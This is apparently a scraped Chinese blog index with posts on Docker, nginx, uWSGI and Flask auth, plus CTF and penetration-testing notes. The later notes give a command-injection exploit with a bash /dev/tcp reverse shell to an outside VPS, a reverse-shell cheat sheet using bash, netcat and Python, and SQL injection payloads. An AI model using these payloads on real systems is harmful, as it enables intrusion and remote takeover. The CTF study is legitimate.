/etc/nginx/nginx.conf &amp;&amp; nginx -g &apos;daemon off;&apos;&quot; 或者：123456789101112131415161718192021222324252627version: &quot;3&quot;services: flask: build: ./flask/ restart: always container_name: flask networks: - code-network nginx: image: nginx environment: TEST_PATH : flask container_name: nginx ports: - 80:80 volumes: - /root/t/nginx/nginx.conf:/1.conf networks: - code-network command: /bin/bash -c &quot;envsubst &lt; /1.conf &gt; /etc/nginx/nginx.conf &amp;&amp; nginx -g &apos;daemon off;&apos;&quot; networks: code-network: driver: bridge 首先是nginx模块下的depends_on或link。两者的作用都是可以将不同的容器加入到同一个网络,这样，就可以将docker-compose.xml文件中的flask识别为容器的ip link在谋篇blog中看到了这样的描述： 其实就是在容器中的/etc/hosts添加容器id和别名的映射 但是在官网看到了这句话： One feature that user-defined networks do not support that you can do with –link is sharing environmental variables between containers. However, you can use other mechanisms such as volumes to share environment variables between containers in a more controlled way. 所以link似乎还可共享变量。但是： links provide a legacy interface to connect Docker containers running on the same host to each other without exposing the hosts’ network ports. Use the Docker networks feature instead depends_on基本大部分的资料都是说解决依赖关系。但是我很好奇,当我在docker-compose.xml文件，没有加入depends_on时，environment中的TEST_PATH没有取到flask这个值。（这个值需要用到network来解决。）所以我不知道，我这次的失败是因为启动顺序导致的，还是没有再同一个网络导致的，如果是由于同一个网络导致，那么depends_on看来也可起到与link相似的功能。总之少用link，多用depends_on与net_work。command解决上面网络问题后，就是commond的问题了。最一开始的问题是，如何再nginx的配置文件中，获得环境变量。command: /bin/bash -c &quot;envsubst &lt; /1.conf &gt; /etc/nginx/nginx.conf &amp;&amp; nginx -g &#39;daemon off;&#39;&quot;后面的nginx -g &#39;daemon off&#39;是开启nginx服务。那么前面呢？ 存在环境变量 ${TERM} 为 xterm，有文件 1.txt 中内容是 ${TERM}所以envsubst &lt; /1.conf &gt; /etc/nginx/nginx.conf的意思是，将 /1.conf中的环境变量替换，然后输入到 /etc/nginx/nginx.conf中。如果需要指定特定的要替换的变量，可以用：1envsubst &apos;$NGINX_HOST $NGINX_PORT $HOST_IP&apos; &lt; /1.conf &gt; /etc/nginx/nginx.conf","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"nginx","slug":"web/nginx","permalink":"https://17307.github.io/categories/web/nginx/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://17307.github.io/tags/docker/"},{"name":"flask","slug":"flask","permalink":"https://17307.github.io/tags/flask/"},{"name":"nginx","slug":"nginx","permalink":"https://17307.github.io/tags/nginx/"}]},{"title":"docker","slug":"docker","date":"2018-10-28T02:46:48.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/10/28/docker/","link":"","permalink":"https://17307.github.io/2018/10/28/docker/","excerpt":"","text":"0x00 安装官网 0x01 基本命令image12345# 拉取docker image pull hello-world# 运行image ， 产生 containerdocker container run hello-world container123456789# 列出本机正在运行的容器docker container ls# 列出本机所有容器，包括终止运行的容器docker container ls --all# 杀死某个 containerdocker container kill [containID] Dockerfile这里给出一个flask的小例子。 项目目录 app.py123456789101112from flask import Flaskapp = Flask(__name__)@app.route('/')def hello_world(): return 'Hello DockerFile!'if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) Dockerfile1234567891011121314FROM python:3#安装flaskRUN [&quot;pip&quot;,&quot;install&quot;,&quot;flask&quot;]#创建文件夹RUN mkdir -p /flask/project#复制文件到相应目录COPY app.py /flask/project/#切换目录到/flask/projectWORKDIR /flask/project#暴露端口,允许外部链接EXPOSE 5000#容器启动时 执行的命令 运行flask程序CMD [&quot;python&quot;,&quot;app.py&quot;] 创建镜像与启动123456789101112131415161718192021222324252627#首先把app.py Dockerfile文件一起放到一个文件夹下面 然后运行#flask 是镜像的名字#注意末尾的 .docker build -t flask . #这条命令运行flask镜像 并把flask镜像中的5000端口和宿主机中的6000端口作映射docker run -p 6000:5000 flask#后台启动容器docker run -d -p 6000:5000 flask#查看容器中的标准输出docker logs [ID]#查看正在运行的容器docker ps #杀死某个正在运行docker kill [ID]#进入docker的终端# -i 允许你对容器内的标准输入 (STDIN) 进行交互# -t （个人实验是用于交互）docker run -i -t [image] /bin/bash# docker container exec命令用于进入一个正在运行的 docker 容器。如果docker run命令运行容器的时候，没有使用-it参数，就要用这个命令进入容器。一旦进入了容器，就可以在容器的 Shell 执行命令了。docker container exec -it [containerID] /bin/bash 某些变量Volumn 想要了解Docker Volume，首先我们需要知道Docker的文件系统是如何工作的。Docker镜像是由多个文件系统（只读层）叠加而成。当我们启动一个容器的时候，Docker会加载只读镜像层并在其上（译者注：镜像栈顶部）添加一个读写层。如果运行中的容器修改了现有的一个已经存在的文件，那该文件将会从读写层下面的只读层复制到读写层，该文件的只读版本仍然存在，只是已经被读写层中该文件的副本所隐藏。当删除Docker容器，并通过该镜像重新启动时，之前的更改将会丢失。在Docker中，只读层及在顶部的读写层的组合被称为Union File System（联合文件系统）。 为了能够保存（持久化）数据以及共享容器间的数据，Docker提出了Volume的概念。简单来说，Volume就是目录或者文件，它可以绕过默认的联合文件系统，而以正常的文件或者目录的形式存在于宿主机上。 大概总结一下上面的内容，就是可以实现：存储数据和共享数据。 12#将宿主机当前目录的db目录 与 镜像中的 /data/db 做挂载docker run -p 27017:27017 -v $PWD/db:/data/db -d mongo:3.2 通过 VOLUME 指令创建的挂载点，无法指定主机上对应的目录，是自动生成的.语法为：12FROM ubuntuVOLUME [&quot;/data1&quot;,&quot;/data2&quot;] 保存修改的容器1docker commit 614122c0aabb aoct/apache2 0x02 注意今天遇到遇到了一个有趣的事情，我在构建一个镜像的时候，Dockerfile如下：12345FROM ubuntuRUN apt-get updateRUN apt-get install python3CMD /bin/bash 此时会报错退出，个人分析是因为在安装python3的过程中，需要用户的输入，导致docker中断。所以需要改成12345FROM ubuntuRUN apt-get updateRUN apt-get install -y python3CMD /bin/bash -y表示同意各种要求。","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"docker","slug":"web/docker","permalink":"https://17307.github.io/categories/web/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://17307.github.io/tags/docker/"}]},{"title":"uwsgi","slug":"uwsgi","date":"2018-10-28T02:45:33.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/10/28/uwsgi/","link":"","permalink":"https://17307.github.io/2018/10/28/uwsgi/","excerpt":"","text":"镇楼https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/index.html 个人理解uwsgi是类似nginx或者apache这类容器与python交互的东西。 WSGI 是一个 Python 协议，定义了应用程序（我们写的软件）如何与 Web 服务器（如 Nginx）通信，WSGI 只是一个接口 WSGI是一种通信协议。uwsgi同WSGI一样是一种通信协议。而uWSGI是实现了uwsgi和WSGI两种协议的Web服务器。 从某种角度来看，uwsgi是一种没有nginx优秀的容器。(不知道说法是否准确) https://lufficc.com/blog/how-to-serve-flask-applications-with-uwsgi-and-nginx-on-ubuntu 安装1pip install uwsgi 例子现在将实现一个简单的小例子，顺便进行发散式的扩充，因为正在学习docker，所以在docker的环境下进行。 docker环境Dockerfile123456FROM python:3RUN pip install uwsgi \\ &amp;&amp; pip install flask EXPOSE 5000CMD /bin/bash **在 $PWD/python 下创建一个简单的 12345678```pythonfrom flask import Flaskapp = Flask(__name__)@app.route(&apos;/&apos;)def index(): return &quot;&lt;span style=&apos;color:red&apos;&gt;Hello World !&lt;/span&gt;&quot; 启动docker1docker run -p 5000:5000 -v $PWD/python:/data -it uwsgi 通过uwsgi启动flask123uwsgi --http 0.0.0.0:5000 -w app:app# 或者uwsgi --socket 0.0.0.0:5000 --protocol=http -w app:app -w app:app 等价于 --wsgi-file app.py --callable app指定 哪个文件下的哪个变量用来执行。 --http 原本情况下，uwsgi是处理WSGI协议，所以需要指定 是http来处理。如果是用--socket情况下，是建立起一个通信的socket，可以用来和nginx通信。此时，通过protocol来指定http协议。 https://uwsgi-docs-zh.readthedocs.io/zh_CN/latest/HTTP.html http-socket 选项将会让uWSGI和原生HTTP通信。如果你的web服务器不支持 uwsgi protocol ，但是可以与上游HTTP代理通信，或者如果你正在用诸如Webfaction或者Heroku这样的服务来托管你的应用，那么你可以使用 http-socket 。如果你计划只通过uWSGI开放你的应用，那么用 http 选项来代替，因为路由器/代理/负载均衡器将会保护你。 与nginx的通信 有两种方式： 用 ip+端口 方式来指定 socket，ip可能有问题，这里还不了解--socket 0.0.0.0:5000 用 文件方式 指定socketsocket = /home/yy/code/project/py/n.sock 此时需要nginx中使用不同的方法来配置对应socket。 下图中的 ip可能有问题，这里还不了解。 例子2123456789FROM python:3RUN pip install uwsgi &amp;&amp;\\ pip install flask &amp;&amp;\\ mkdir /dataEXPOSE 5000COPY ./app.py /dataWORKDIR /dataCMD [&quot;uwsgi&quot;,&quot;--http&quot;,&quot;0.0.0.0:5000&quot;,&quot;-w&quot;,&quot;app:app&quot;] 例子3这个例子用于介绍 uwsgi的配置文件 如何写123456789[uwsgi]http = 0.0.0.0:5000# 指定运行的文件的位置chdir = /data/wsgi-file = /data/app.py# 指定变量callable = appprocesses = 4threads = 2 当然也可如此12345678[uwsgi]socket = 0.0.0.0:5000protocol = httpchdir = /data/wsgi-file = /data/app.pycallable = appprocesses = 4threads = 2 执行命令：1uwsgi uwsgi.ini 所以新的Dockerfile为:12345678910FROM python:3RUN pip install uwsgi &amp;&amp;\\ pip install flask &amp;&amp;\\ mkdir /dataEXPOSE 5000COPY ./app.py /dataCOPY ./uwsgi.ini /dataWORKDIR /dataCMD [&quot;uwsgi&quot;,&quot;uwsgi.ini&quot;] 然后1docker build -t uwsgi3 . 然后1docker run -p 5000:5000 uwsgi","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"}],"tags":[]},{"title":"nginx","slug":"nginx","date":"2018-10-28T02:44:12.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/10/28/nginx/","link":"","permalink":"https://17307.github.io/2018/10/28/nginx/","excerpt":"","text":"nginx 配置安装apt install nginx pip install uwsgi 配置 创建uwsgi的配置文件 12345678910111213141516[uwsgi]#项目的位置chdir = /home/yy/code/project/py/flask-nginx/onlinetools#要运行的文件wsgi-file = /home/yy/code/project/py/flask-nginx/onlinetools/main.py#要调用的函数callable = app# python的虚拟路径home = /home/yy/code/project/py/flask-nginx/onlinetools/venv#socket file's locationsocket = /home/yy/code/project/py/n.sock#permissions for the socket filechmod-socket = 666 uwsgi --ini uwsgi.ini 配置 nginx.conf 12345678910111213141516server &#123; listen 8000; server_name localhost; charset utf-8; client_max_body_size 75M; location ^~ /static &#123; root /home/yy/code/project/py/flask-nginx/onlinetools/cmsscan; # static的上层目录 expires 30d; &#125; location / &#123; include uwsgi_params; uwsgi_pass unix://home/yy/code/project/py/n.sock; &#125;&#125; 首先删除默认的配置 sudo rm /etc/nginx/sites-enabled/default 然后将写的配置建立软连接 sudo ln -s /home/yy/code/project/py/nginx/nginx.conf /etc/nginx/conf.d 关于如何配置静态资源的路径以及一些其他的配置：https://my.oschina.net/u/238296/blog/599706 配置uwsgi可以一直运行 nohup uwsgi --ini config2.ini &amp; nginx停止与开始sudo /etc/init.d/nginx stop sudo /etc/init.d/nginx start nginx其他命令 查看nginx路径 ps aux|grep nginx 查看nginx配置文件路径 /usr/local/opt/nginx/bin/nginx -t 坑 manjaro上，始终是502，将sock文件更换目录……权限问题……尚未有更好方法 无法加载静态资源，使nginx以root/项目用户 启动……尚未有其他方案；在配置文件添加：user o1hy","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"nginx","slug":"web/nginx","permalink":"https://17307.github.io/categories/web/nginx/"}],"tags":[]},{"title":"Xpath","slug":"Xpath","date":"2018-10-28T02:41:59.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/10/28/Xpath/","link":"","permalink":"https://17307.github.io/2018/10/28/Xpath/","excerpt":"","text":"0x00 例子123456789101112import requestsfrom lxml import htmlpage = requests.get('http://econpy.pythonanywhere.com/ex/001.html')tree = html.fromstring(page.text)buyers = tree.xpath('/html/body/div/div/text()')# 这将创建prices的列表：prices = tree.xpath('//span[@class=\"item-price\"]/text()')# /html/body/div[5]/div /html/body/div[5] /html/body/script/text()print(buyers)print(prices) 0x01 Xpath 语法XML 实例文档123456789101112131415&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;bookstore&gt;&lt;book&gt; &lt;title lang=\"eng\"&gt;Harry Potter&lt;/title&gt; &lt;price&gt;29.99&lt;/price&gt;&lt;/book&gt;&lt;book&gt; &lt;title lang=\"eng\"&gt;Learning XML&lt;/title&gt; &lt;price&gt;39.95&lt;/price&gt;&lt;/book&gt;&lt;/bookstore&gt;","categories":[{"name":"python","slug":"python","permalink":"https://17307.github.io/categories/python/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://17307.github.io/tags/爬虫/"}]},{"title":"flask-token认证","slug":"flask-token认证","date":"2018-09-30T09:39:06.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/30/flask-token认证/","link":"","permalink":"https://17307.github.io/2018/09/30/flask-token认证/","excerpt":"flask 前后端分离 token认证","text":"flask 前后端分离 token认证 0x00 用curl提交数据坑curl -H &quot;Accept: application/json&quot; -H &quot;Content-type:application/json&quot; -X POST -d &quot;{\\&quot;username\\&quot;: \\&quot;123\\&quot;, \\&quot;password\\&quot;: \\&quot;234\\&quot;}&quot; http://127.0.0.1:5000/api/test不知道为什么自己的单引号写法不可以。网上大部分人给的都是 用单引号扩起json内容，里面的双引号不转义。即curl -H &quot;Accept: application/json&quot; -H &quot;Content-type:application/json&quot; -X POST -d &#39;{&quot;username&quot;: &quot;123&quot;, &quot;password&quot;: &quot;234&quot;}&#39; http://127.0.0.1:5000/api/test 但这个测试错误。 curl用法1234567891011121314151617# 提交cookiecurl http://man.linuxde.net --cookie \"user=root;pass=123456\"# user-agentcurl URL --user-agent \"Mozilla/5.0\"curl URL -A \"Mozilla/5.0\"# 其他信息头curl -H \"Host:man.linuxde.net\" -H \"accept-language:zh-cn\" URL# HTTP基础认证curl -u user:pwd http://man.linuxde.net# `-i`参数可以显示http response的头信息，连同网页代码一起。curl -i www.sina.com# GETcurl example.com/form.cgi?data=xxx# POSTcurl -X POST --data \"data=xxx\" example.com/form.cgi# cookiecurl --cookie \"name=xxx\" www.example.com 0x01 与flask-login的不同flask-login在flask-login中，对于需要登陆的函数，修饰符为@login_required。它的回调方法是：@login_manager.user_loader12345678910111213@login_manager.user_loaderdef load_user(user_id): print(\"user_id: \" + user_id) return User.query.filter_by(userid=user_id).first()@app.route('/test')@login_requireddef test(): return \"yes , you are allowed\"'''在load_user方法中，会自动在session中得到用户的user_id。然后判断是否有这个user_id的用户。''' 前后分离-HTTPBasicAuth在前后端分离的token验证过程中，修饰符为`@auth.login_required,它的回调方法是@auth.verify_password`.1234567891011121314151617181920212223242526272829@auth.verify_passworddef verify_password(username_or_token, password): if request.path == \"/api/login\": # 支持用表单的方式提交数据 username_and_password_post = request.get_json() if username_and_password_post.get('email') is not None: username_or_token = username_and_password_post['email'] if username_and_password_post.get('password') is not None: password = username_and_password_post['password'] user = User.query.filter_by(username=username_or_token).first() if not user or not user.verify_password(password): return False else: user = User.verify_auth_token(username_or_token) if not user: return False g.user = user return True @app.route(\"/\", methods=['POST', 'GET'])@auth.login_requireddef index(): return jsonify('Hello, %s' % g.user.username) '''被@auth.login_required拦截后，会调用verify_password方法。两个参数会自动赋值为HTTP基础认证中的username和password。''' 总结实际上，flask-login中的@login_manager.user_loader是会话管理功能。在session中取值。而 HTTPBasicAuth 中的`@auth.verify_password做的更多的是token`或者其他形式的认证。 0x02 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133\"\"\"api.py\"\"\"# -*- coding:utf-8 -*-from passlib.apps import custom_app_contextfrom itsdangerous import TimedJSONWebSignatureSerializer as Serializer, SignatureExpired, BadSignaturefrom flask import Flaskfrom flask_sqlalchemy import SQLAlchemyfrom flask_httpauth import HTTPBasicAuthfrom flask_cors import CORSfrom flask import jsonify, request, abort, gapp = Flask(__name__)# flask的跨域解决CORS(app, supports_credentials=True)# 可以获取config.py的内容app.config.from_object('config')db = SQLAlchemy(app)auth = HTTPBasicAuth()class User(db.Model): __tablename__ = 'users' id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(32), index=True) password = db.Column(db.String(128)) # 密码加密 def hash_password(self, password): self.password = custom_app_context.encrypt(password) # 密码解析 def verify_password(self, password): return custom_app_context.verify(password, self.password) # 获取token，有效时间10min def generate_auth_token(self, expiration=600): s = Serializer(app.config['SECRET_KEY'], expires_in=expiration) return s.dumps(&#123;'id': self.id&#125;) # 解析token，确认登录的用户身份 @staticmethod def verify_auth_token(token): s = Serializer(app.config['SECRET_KEY']) try: data = s.loads(token) except SignatureExpired: return None # valid token, but expired except BadSignature: return None # invalid token user = User.query.get(data['id']) return user# db.create_all() 创建表@app.route(\"/\", methods=['POST', 'GET'])@auth.login_requireddef index(): return jsonify('Hello, %s' % g.user.username)@app.route('/api/register', methods=['POST'])def new_user(): json_data = request.get_json() username = json_data['username'] password = json_data['password'] if username is None or password is None: abort(400) # missing arguments if User.query.filter_by(username=username).first() is not None: abort(400) # existing user user = User(username=username) user.hash_password(password) db.session.add(user) db.session.commit() return jsonify(&#123;'username': user.username&#125;)@auth.verify_passworddef verify_password(username_or_token, password): if request.path == \"/api/login\": username_and_password_post = request.get_json() if username_and_password_post.get('email') is not None: username_or_token = username_and_password_post['email'] if username_and_password_post.get('password') is not None: password = username_and_password_post['password'] user = User.query.filter_by(username=username_or_token).first() if not user or not user.verify_password(password): return False else: user = User.verify_auth_token(username_or_token) if not user: return False g.user = user return True@app.route('/api/login', methods=['POST', 'GET'])@auth.login_requireddef get_auth_token(): token = g.user.generate_auth_token() token = str(token, encoding='utf8') return jsonify(token)@app.route('/api/test', methods=['POST'])def test(): b = request.get_json() print(b) return \"test\"app.run(debug=True)\"\"\"config.py\"\"\"import osbasedir = os.path.abspath(os.path.dirname(__file__))SQLALCHEMY_DATABASE_URI = \"mysql://root:root@127.0.0.1/flaskrest\"SQLALCHEMY_MIGRATE_REPO = os.path.join(basedir, 'db_repository')SQLALCHEMY_TRACK_MODIFICATIONS = TrueBASEDIR = basedir# 安全配置CSRF_ENABLED = TrueSECRET_KEY = 'jssssaqer123dsaf/sdf\\sdf'","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"flask","slug":"web/flask","permalink":"https://17307.github.io/categories/web/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"https://17307.github.io/tags/flask/"}]},{"title":"flask-login","slug":"flask-login","date":"2018-09-30T09:36:59.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/30/flask-login/","link":"","permalink":"https://17307.github.io/2018/09/30/flask-login/","excerpt":"flas-login","text":"flas-login 0x00 原理首次登陆 第二次登陆 0x01 实现SQLAlchemy操作数据库首先给定数据库信息 结构传统的数据库表是一个二维表。而SQLAlchemy使用对象来表示。1234567891011121314151617# 传统的[ ('1', 'Michael'), ('2', 'Bob'), ('3', 'Adam')]# SQLAlchemyclass User(object): def __init__(self, id, name): self.id = id self.name = name[ User('1', 'Michael'), User('2', 'Bob'), User('3', 'Adam')] 用法直接用法直接 flask中的用法1234567891011121314151617181920212223242526272829303132from flask_sqlalchemy import SQLAlchemyapp = Flask(__name__)# 引擎 数据库://username:password@ip/databaseapp.config['SQLALCHEMY_DATABASE_URI'] = \"mysql://root:root@127.0.0.1/taskt\"# 创建对象db = SQLAlchemy(app)# 定义用户模型class User(UserMixin, db.Model): __tablename__ = 'user' userid = db.Column('userid', Integer, primary_key=True) username = db.Column('username', String(30), unique=True) email = db.Column('email', String(50), unique=True) password = db.Column('password', String(100), unique=False) def __init__(self, username, password, email=None): self.username = username self.password = password self.email = email def is_authenticated(self): return True# 获取数据username = form.username.datapassword = form.password.dataemail = form.email.data# 添加数据db.session.add(User(username=username, password=password, email=email))db.session.commit()# 查询数据db_pass_user = User.query.filter_by(username=username).first() flask-login123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#!/usr/bin/env python# encoding: utf-8from flask import Flask, Blueprint, render_template, request, redirectfrom flask_sqlalchemy import SQLAlchemyfrom sqlalchemy import Integer, Stringfrom flask_login import (LoginManager, login_required, login_user, logout_user, UserMixin, )from wtforms import StringField, PasswordField, SubmitField, Formfrom flask_cors import CORSapp = Flask(__name__)CORS(app, supports_credentials=True)app.config['SQLALCHEMY_DATABASE_URI'] = \"mysql://root:root@127.0.0.1/taskt\"db = SQLAlchemy(app)class LoginForm(Form): username = StringField('username') password = PasswordField('password') email = StringField('email') submit = SubmitField('submit')# user modelsclass User(UserMixin, db.Model): __tablename__ = 'user' userid = db.Column('userid', Integer, primary_key=True) username = db.Column('username', String(30), unique=True) email = db.Column('email', String(50), unique=True) password = db.Column('password', String(100), unique=False) def __init__(self, username, password, email=None): self.username = username self.password = password self.email = email def is_authenticated(self): return True def is_actice(self): return True def is_anonymous(self): return False def get_id(self): return str(self.userid) # User.query.filter_by(username=self.username).first().userid def __repr__(self): return '&lt;%s %s&gt;' % (self.username, self.password)# flask-loginapp.secret_key = 's3cr3t'login_manager = LoginManager()login_manager.session_protection = 'strong'login_manager.login_view = 'login'login_manager.init_app(app)@login_manager.user_loaderdef load_user(user_id): print(\"user_id: \" + user_id) return User.query.filter_by(userid=user_id).first()@app.route('/login', methods=['GET', 'POST'])def login(): form = LoginForm(request.form) if request.method == 'POST' and form.validate(): username = form.email.data password = form.password.data db_pass_user = User.query.filter_by(username=username).first() if db_pass_user and db_pass_user.password == password: login_user(db_pass_user) return render_template(\"home.html\", data=db_pass_user) else: return \"wrong username/password \" else: return render_template(\"login.html\", form=form)@app.route(\"/register\", methods=['POST', 'GET'])def register(): form = LoginForm(request.form) if request.method == 'POST' and form.validate(): username = form.username.data password = form.password.data email = form.email.data db.session.add(User(username=username, password=password, email=email)) db.session.commit() return \"success\"@app.route(\"/\")@app.route(\"/index\")def index(): return render_template(\"/index.html\", form=LoginForm()) # redirect('/login')@app.route('/logout', methods=['GET', 'POST'])@login_requireddef logout(): logout_user() return \"logout page\"# test method@app.route('/test')@login_requireddef test(): return \"yes , you are allowed\"app.run(debug=True) 0x02 跨域问题12from flask_cors import CORSCORS(app, supports_credentials=True)","categories":[{"name":"web","slug":"web","permalink":"https://17307.github.io/categories/web/"},{"name":"flask","slug":"web/flask","permalink":"https://17307.github.io/categories/web/flask/"}],"tags":[{"name":"flask","slug":"flask","permalink":"https://17307.github.io/tags/flask/"}]},{"title":"GET命令漏洞","slug":"GET命令漏洞","date":"2018-09-30T09:26:17.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/30/GET命令漏洞/","link":"","permalink":"https://17307.github.io/2018/09/30/GET命令漏洞/","excerpt":"","text":"0x00 题目描述php的 shell_exec 执行了 GET 命令。GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求 123456789101112&lt;?php $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); 0x01 分析最主要就是$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;])); 漏洞在于 GET 可以执行命令。1touch 'ls|' # 此命令我只在vps上执行成功。而 kali和ubuntu18创建后的内容均不可以。 vps:ubuntu与kali(多了2个单引号):当创建好文件后，使用如下命令就可以执行。1GET 'file:ls|' 而刚才多了单引号的则不可以。 0x02 解决所以需要在服务端的执行一个bash脚本用来反弹shell。在服务端的执行1GET 'file:bash a|' 所以需要在服务器创建2个文件。一个名字是bash a|，另一个是a|。其中a|中是要执行的脚本。 payload为：123?url=http://yourvps/a.txt&amp;filename=a?url=&amp;filename=bash a|?url=file:bash a|&amp;filename=xxx a.txt的内容是：1bash -i &gt;&amp; /dev/tcp/your_vps/port 0&lt;&amp;1 2&gt;&amp;1 0x03 反弹脚本bash1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 bash -i是打开一个交互的bash./dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/ 要想了解&gt;&amp;和0&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。&gt;&amp;或者&amp;&gt;将错误和输出均重定向。 NetCat如果目标主机支持“-e”选项的话，我们就可以直接用1nc -e /bin/bash 10.42.0.1 1234 否则，现在自己的vps上监听两个端口：12nc -l -p 1234 -vvnc -l -p 4321 -vv 然后在目标主机上执行以下命令：1nc 10.42.0.1 1234 | /bin/bash | nc 10.42.0.1 4321 python12345678python -c\" import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.42.0.1\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);\"","categories":[{"name":"ctf","slug":"ctf","permalink":"https://17307.github.io/categories/ctf/"}],"tags":[]},{"title":"常见sql注入语句","slug":"常见sql注入语句","date":"2018-09-30T09:21:02.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/30/常见sql注入语句/","link":"","permalink":"https://17307.github.io/2018/09/30/常见sql注入语句/","excerpt":"常见的SQL注入","text":"常见的SQL注入 0x00 爆数据库下的库,表,列爆库 http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1&#39; union select group_concat(schema_name),3 from information_schema.schemata -- + 爆表 http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#39;security&#39; -- + 爆字段 http://localhost/sqllib/sqli-labs-master/sqli-labs-master/Less-1/?id=-1&#39; union select 1,GROUP_CONCAT(column_name) from information_schema.columns where table_name=&#39;users&#39; -- a 0x01 常见报错注入 rand不能和order by一起用 select * from users where id=1 and (select 1 from (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))a); select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a); extractvalue（） select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); select * from users where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 基于时间的SQL盲注 slect ..... union select If(ascii(substr(database(),1,1))&gt;115,0,sleep(5)) 0x02 宽字节注入判断方式： 尝试 页面编码是gbk 使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\\’，其中\\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击.宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码 %df%27—&gt;(addslashes)—&gt;%df%5c%27—&gt;(GBK)—-&gt;運’ 用户输入—&gt; 过滤函数–&gt; 代码层的$sql–&gt;mysql处理请求–&gt;mysql中的sql 为了避免宽字节注入，很多人使用iconv函数（能够完成各种字符集间的转换$text=iconv(“UTF-8”,”GBK”,$text);），其实这样做是有很大风险的，仍旧可以造成宽字节注入。可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c,是不是已经看出来了，当传入的值是錦’，’通过addslashes转义为’(%5c%27),錦通过icov转换为%e5%5c，终止变为了%e5%5c%5c%27,不难看出%5c%5c正好把反斜杠转义，使单引号逃逸，造成注入。 iconv(“utf-8”,”gbk”,”錦”);编码转换echo bin2hex($t);输出字节码 0x03 delete在一次delete语句的注入中，发现一个好玩的东西。delete语句拼接一些语句时.只有当表中存在数据时，如下语句才会执行：12DELETE from dami_flash WHERE (id=3) or sleep(5);DELETE from dami_flash WHERE (id=3) or (select sleep(5));","categories":[{"name":"PT","slug":"PT","permalink":"https://17307.github.io/categories/PT/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://17307.github.io/tags/sql/"},{"name":"ctf","slug":"ctf","permalink":"https://17307.github.io/tags/ctf/"}]},{"title":"Nginx配置不当","slug":"Nginx配置不当","date":"2018-09-15T02:20:21.000Z","updated":"2019-02-02T11:52:17.000Z","comments":true,"path":"2018/09/15/Nginx配置不当/","link":"","permalink":"https://17307.github.io/2018/09/15/Nginx配置不当/","excerpt":"","text":"题目描述文件包含,nginx配置读取 title: 百度杯2017二月-Zone 解题首先找到了文件包含的漏洞. 发现无法使用伪协议读取.同时,module后面的路径会过滤,将 ../ 过滤为 空.所以需要构造 ..././ 可以绕过. 读取nginx配置文件. 发现最后还有一个包含,继续读. 发现内容1234location /online-movies &#123; alias /movie/; # 改变地址 autoindex on; # 文件夹读取 &#125; 会把 /online-movies../变为 /moive/../ 伪协议不可用是因为1include 